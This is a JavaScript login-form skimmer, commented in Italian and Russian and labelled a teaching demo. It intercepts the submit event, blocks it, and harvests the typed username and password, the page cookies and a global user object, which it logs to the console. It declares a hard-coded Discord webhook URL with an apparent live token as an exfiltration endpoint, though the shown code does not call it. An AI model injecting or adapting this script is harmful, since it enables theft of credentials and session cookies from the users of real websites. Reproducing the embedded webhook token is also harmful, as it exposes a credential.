setTimeout(() => {
  (function () {

    // Вебхук для отправки данных. Вставлен напрямую для демонстрации.
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1460557076446183487/CQMYJKu2PV9us7XirOp75oLiyzGF40ctmCsweS2LSu_hK-LqCPi5pPf0hX21TMeOzzH8';

      
    console.log("📘 Script didattico combinato avviato");

    /* =========================
       FUNZIONI DIMOSTRATIVE
       ========================= */

    // Lettura credenziali (come nel primo script)
    const getCredentials = () => {
      try {
        const usernameField =
          document.querySelector('#loginUsername') ||
          document.querySelector('#username') ||
          document.querySelector('input[name="login"]') ||
          document.querySelector('input[type="text"]');

        const passwordField =
          document.querySelector('#password') ||
          document.querySelector('input[type="password"]');

        return {
          username: usernameField ? usernameField.value : "NON_TROVATO",
          password: passwordField ? passwordField.value : "NON_TROVATO"
        };
      } catch {
        return {
          username: "ERRORE",
          password: "ERRORE"
        };
      }
    };

    // Lettura cookie (SOLO DIMOSTRATIVA)
    const getAllCookies = () => {
      return document.cookie || "Nessun cookie presente";
    };

    // Lettura variabile user se esiste (SOLO DIMOSTRATIVA)
    const getUserData = () => {
      try {
        if (typeof user !== "undefined") {
          return structuredClone(user);
        }
        return "Variabile user non presente";
      } catch (e) {
        return "Errore lettura user";
      }
    };

    /* =========================
       COMBINAZIONE CON SCRIPT LOGIN
       ========================= */

    const form = document.getElementById("loginForm");
    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");

    if (!form || !usernameInput || !passwordInput) {
      console.warn("⚠️ Form o input non trovati");
      return;
    }

    form.addEventListener("submit", (event) => {
      event.preventDefault();

      const username = usernameInput.value;
      const password = passwordInput.value;

      console.log("📨 SUBMIT intercettato");
      console.log("👤 Username:", username);
      console.log("🔐 Password:", password);

      // Uso delle funzioni del primo script
      const credentials = getCredentials();
      const cookies = getAllCookies();
      const userData = getUserData();

      console.log("📄 REPORT DIDATTICO (NON INVIATO)");
      console.log({
        timestamp: new Date().toLocaleString(),
        credentials,
        cookies,
        userData
      });

      console.log("✅ Fine dimostrazione");
    });

  })();
}, 1000);
